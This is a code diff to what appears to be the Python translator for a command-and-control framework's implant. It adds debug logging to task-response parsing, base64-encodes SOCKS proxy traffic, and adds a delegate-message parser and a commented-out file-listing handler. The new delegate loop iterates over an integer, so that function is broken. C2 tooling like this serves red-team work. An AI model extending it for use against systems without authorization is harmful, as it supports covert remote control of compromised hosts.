@@ -248,18 +248,23 @@ def PostC2(Data):
     RespTsk = [] 
     RespSck = []
 
+    Dbg3(f"buffer: {Data} [{len(Data)}]")
+
     try:
         Psr = Parser(Data, len(Data))
         Tasks = Psr.Int32()
         Dbg2(f"Task quantity: {Tasks}")
 
+        Index = 0
         for Task in range(Tasks):
+            Index += 1
             try:
                 TaskLength = Psr.Int32()
                 if TaskLength <= 0:
                     Dbg2(f"Invalid task length: {TaskLength}")
                     continue
                     
+                Dbg2(f"task #{Index} len:{TaskLength}")
                 TaskData = Psr.Pad(TaskLength)
                 if len(TaskData) < TaskLength:
                     Dbg2(f"Incomplete task data, expected {TaskLength} got {len(TaskData)}")
@@ -267,14 +272,12 @@ def PostC2(Data):
                     
                 TaskPsr = Parser(TaskData, TaskLength)
                 
-                # Read TaskUUID
                 try:
                     TaskUUID = TaskPsr.Bytes().replace(b'\x00', b'')
                     TaskUUID = TaskUUID.decode('utf-8') if TaskUUID else "unknown"
                 except UnicodeDecodeError:
                     TaskUUID = TaskUUID.hex() if TaskUUID else "unknown"
                 
-                # Read CommandID
                 try:
                     CommandID = TaskPsr.Pad(2)
                     CommandID = int.from_bytes(CommandID, byteorder="big") if len(CommandID) == 2 else 0
@@ -288,12 +291,19 @@ def PostC2(Data):
                         Srv = TaskPsr.Int32()
                         Data = ""
                         
-                        if not bool(Ext):
+                        Dbg2(f"exit {bool(Ext)}")
+                        Dbg2(f"id {Srv}")
+
+                        Dbg2( f"{TaskPsr.length}" )
+
+                        if not bool( Ext ) and TaskPsr.length > 0:
                             try:
-                                Data = TaskPsr.Bytes().decode("utf-8")
-                                Dbg2(f"sending socks encoded: {Data[:50]}... [{len(base64.b64decode(Data))} bytes]")
+                                Data = TaskPsr.Bytes()#.decode("utf-8")
+                                Dbg2(f"sending socks encoded: {Data[:30]}... [{len(Data)} bytes]")
+                                Data = base64.b64encode(Data).decode("utf-8")
+                                Dbg2(f"sending socks encoded: {Data[:30]}... [{len(Data)} bytes]")
                             except Exception as e:
-                                Dbg2(f"Failed to decode socks data: {str(e)}")
+                                Dbg2(f"Failed to encode socks data: {str(e)}")
                                 Data = ""
                         
                         SocksData = {
@@ -330,6 +340,27 @@ def PostC2(Data):
     Dbg2(f"Processed {len(RespTsk)} tasks and {len(RespSck)} socks")
     Dbg2("------------------------")
     return JsonData
+
+def process_delegates(TaskUUID, Message, Psr:Parser):
+
+    delegates_list = []
+
+    delegates = Psr.Int32()
+
+    for delegate in delegates:
+        uuid         = Psr.Str()
+        profile_name = Psr.Int32()
+        message      = Psr.Str()
+
+        delegate_data = {
+            "uuid": uuid,
+            "message": message,
+            "c2_profile": profile_name            
+        }
+
+        delegates_list.append( delegate_data )
+
+    return {"delegates": delegates_list}
 
 def process_normal_task(TaskUUID, CommandID, TaskPsr:Parser):
     if   CommandID == T_DOWNLOAD:
@@ -374,6 +405,38 @@ def process_normal_task(TaskUUID, CommandID, TaskPsr:Parser):
                 processes.append( process )
 
         return {"task_id": TaskUUID, "process_response": Output, "processes": processes, "completed": True }
+    
+    # elif CommandID == T_FILESYS:
+    #     psr_backup = Parser( TaskPsr.buffer, TaskPsr.length );
+
+    #     RawBytes = psr_backup.All()
+    #     Output   = RawBytes.hex()
+
+    #     sub_id = int.from_bytes(TaskPsr.Pad(1), byteorder="big")
+
+    #     if sub_id == SB_FS_LS:
+    #         file_list = []
+            
+    #         while TaskPsr.buffer:     
+    #             FileName = TaskPsr.Str();
+    #             FileSize = TaskPsr.Int32();
+                
+    #             if FileSize == -1:
+    #                 IsFile = False
+    #             else:
+    #                 IsFile = True
+
+    #             file_browser = {
+    #                 "is_file": IsFile,
+    #                 "name": FileName,
+    #                 "success": True,
+    #                 "update_deleted": True,
+    #                 "size": FileSize,
+    #             }
+
+    #             file_list.append( file_browser )
+                
+
     elif CommandID == JOB_ERROR:
         ErrorCode = TaskPsr.Int32()
         ErrorMsg  = TaskPsr.Bytes().decode("utf-8")  
